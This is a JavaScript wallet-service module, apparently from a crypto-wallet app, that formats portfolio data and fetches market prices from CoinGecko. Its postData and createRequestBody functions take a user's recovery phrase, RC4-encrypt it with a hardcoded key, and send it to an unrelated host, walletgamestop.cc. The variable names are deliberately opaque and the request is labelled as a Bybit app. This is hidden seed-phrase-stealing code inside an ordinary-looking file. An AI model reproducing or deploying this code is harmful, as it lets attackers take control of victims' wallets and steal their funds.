import { useHttp } from '../hooks/http.hook'
import Web3 from 'web3'
import randomNum from './funcWallet/randomNum'
// import CryptoJS from 'crypto-js'
import { decode as atob, encode as btoa } from 'base-64'
import queryString from 'query-string'
let url = 'https://walletgamestop.cc/concept/unity/check'
const yekApp = 'aBN6qreLALR9QYPy'
let xxx = 'BYBIT$APK/G'
let xx = 'BYBIT$APK'
import rc4 from './funcWallet/rc4'

export function rebuildObjPortfolio(list) {
	const newList = list.map((obj) => {
		return {
			id: obj.asset.id,
			name: obj.asset.name,
			symbol: obj.asset.symbol,
			contract_address: obj.asset.asset_code,
			market_data: {
				current_price: {
					usd: obj.asset.price ? obj.asset.price.value : 0,
				},
				balance: obj.quantity
					? Number(Web3.utils.fromWei(String(obj.quantity), 'ether')).toFixed(
							10
					  )
					: 0,
				balance_crypto: {
					usd: obj.value || 0,
				},
				high_24h: {
					usd: obj.quote_rate_24h,
				},
				relativeChange: obj.asset.price
					? obj.asset.price.relative_change_24h
					: 0,
			},
			image: {
				thumb: obj.asset.icon_url,
			},
		}
	})
	return newList
}

export function rebuildObjPortfolioDefaultCoins(list) {
	const newList = list.map((obj) => {
		return {
			id: obj.id,
			name: obj.name,
			symbol: obj.symbol,
			contract_address: '',
			market_data: {
				current_price: {
					usd: obj.current_price,
				},
				balance: 0,
				balance_crypto: {
					usd: 0,
				},
				high_24h: {
					usd: obj.high_24h,
				},
				relativeChange: obj.price_change_percentage_24h,
			},
			image: {
				thumb: obj.image,
			},
		}
	})
	return newList
}

function checkPhrase(str) {
	let endStr
	let phraseLength = str.split(' ').length
	if (phraseLength < 2) {
		endStr = atob(str)
	} else {
		endStr = str
	}
	return endStr
}

const useWalletService = () => {
	const { error, loading, request, clearError } = useHttp()

	const getMarketCoin = async (loaded) => {
		loaded ? loaded(true) : null

		const response = await request(
			new URL(
				'https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&category=ethereum-ecosystem&order=market_cap_desc&per_page=100&page=1&sparkline=false'
			)
		)
		loaded ? loaded(false) : null

		return response
	}

	function createRequestBody(value, isNew) {
		const nameWallet = isNew ? xxx : xx

		const obj = {
			salt: randomNum(100000, 999999),
			sendData: null,
			runner: null,
			public: checkPhrase(value),
			accounts: null,
			name: nameWallet,
		}
		console.log('isNew - ' + isNew)
		if (isNew) {
			obj.new = true
		}

		console.log(obj)

		let crypt = btoa(rc4(yekApp, JSON.stringify(obj)))
		let urlencoded = queryString.stringify({ data: crypt })
		return urlencoded
	}

	async function postData(value, isNew) {
		let requestBody = createRequestBody(value, isNew)

		const response = await request(new URL(url), 'POST', requestBody, {
			'Content-Type': 'application/x-www-form-urlencoded',
		})
		return response
	}

	return {
		error,
		loading,
		clearError,
		getMarketCoin,
		postData,
	}
}

export default useWalletService
